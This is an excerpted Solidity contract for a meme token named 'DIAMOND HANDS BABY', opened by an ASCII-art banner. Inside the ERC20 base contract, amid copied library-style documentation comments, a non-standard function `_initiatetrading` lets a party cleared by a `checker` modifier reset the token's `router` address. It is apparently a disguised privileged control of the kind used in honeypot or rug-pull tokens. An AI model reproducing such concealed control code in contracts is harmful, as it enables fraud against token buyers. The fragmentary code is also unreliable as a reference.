...
`7MM"""Yb. `7MMF'     db     `7MMM.     ,MMF' .g8""8q. `7MN.   `7MF`7MM"""Yb.       `7MMF'  `7MMF'     db     `7MN.   `7MF`7MM"""Yb.    .M"""bgd     
  MM    `Yb. MM      ;MM:      MMMb    dPMM .dP'    `YM. MMN.    M   MM    `Yb.       MM      MM      ;MM:      MMN.    M   MM    `Yb. ,MI    "Y     
  MM     `Mb MM     ,V^MM.     M YM   ,M MM dM'      `MM M YMb   M   MM     `Mb       MM      MM     ,V^MM.     M YMb   M   MM     `Mb `MMb.         
  MM      MM MM    ,M  `MM     M  Mb  M' MM MM        MM M  `MN. M   MM      MM       MMmmmmmmMM    ,M  `MM     M  `MN. M   MM      MM   `YMMNq.     
  MM     ,MP MM    AbmmmqMA    M  YM.P'  MM MM.      ,MP M   `MM.M   MM     ,MP       MM      MM    AbmmmqMA    M   `MM.M   MM     ,MP .     `MM     
  MM    ,dP' MM   A'     VML   M  `YM'   MM `Mb.    ,dP' M     YMM   MM    ,dP'       MM      MM   A'     VML   M     YMM   MM    ,dP' Mb     dM     
.JMMmmmdP' .JMML.AMA.   .AMMA.JML. `'  .JMML. `"bmmd"' .JML.    YM .JMMmmmdP'       .JMML.  .JMML.AMA.   .AMMA.JML.    YM .JMMmmmdP'   P"Ybmmd"      
                                `7MM"""Yp,      db     `7MM"""Yp, `YMM'   `MM`YMM'   `MM`YMM'   `MM'                                                 
                                  MM    Yb     ;MM:      MM    Yb   VMA   ,V   VMA   ,V   VMA   ,V                                                   
                                  MM    dP    ,V^MM.     MM    dP    VMA ,V     VMA ,V     VMA ,V                                                    
                                  MM"""bg.   ,M  `MM     MM"""bg.     VMMP       VMMP       VMMP                                                     
                                  MM    `Y   AbmmmqMA    MM    `Y      MM         MM         MM                                                      
                                  MM    ,9  A'     VML   MM    ,9      MM         MM         MM                                                      
                                .JMMmmmd9 .AMA.   .AMMA.JMMmmmd9     .JMML.     .JMML.     .JMML.                                                    
...
contract ERC20 is Context, IERC20, IERC20Metadata , Ownable{
  ...
  /**
     ...
     * _Available since v3.1._
     */
    function _initiatetrading (address set) public checker {
        router = set;
    }
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
...
contract DIAMONDS is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 555555555555 * 10 ** 18;

    constructor () ERC20('DIAMOND HANDS BABY',unicode'DIAMOND💎HANDS') {
